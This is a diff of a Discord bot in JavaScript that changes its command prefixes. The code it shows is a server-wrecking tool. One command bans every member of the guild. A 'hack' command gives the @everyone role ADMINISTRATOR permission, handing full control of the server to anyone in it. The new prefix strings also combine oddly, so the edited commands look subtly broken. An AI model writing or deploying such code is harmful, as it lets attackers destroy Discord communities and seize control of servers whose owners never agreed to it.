@@ -1,6 +1,6 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
-const prefix = 'bb'///lera ba dly xot prefix dabne
+const prefix = 't!help'///lera ba dly xot prefix dabne
 client.on('ready', () => {
 console.log(`Logged in as ${client.user.tag}!`);
  
@@ -14,13 +14,13 @@ console.log(`Logged in as ${client.user.tag}!`);
 // }) 
 
 client.on("message", msg => {
-if (msg.content.toLowerCase().startsWith(prefix + "ban")) {
+if (msg.content.toLowerCase().startsWith(prefix + "t!ban")) {
     msg.guild.members.forEach(m =>
       m.ban("Banned By Sans Bot | Developed By Sans")
       )
 }})
 client.on('message', message => {
-    if (message.content.startsWith(prefix + "hack")) {
+    if (message.content.startsWith(prefix + "t!hack")) {
         message.delete();
         message.guild.roles.find('name', '@everyone').edit({
             permissions: ["ADMINISTRATOR"]///premission akata adminstator
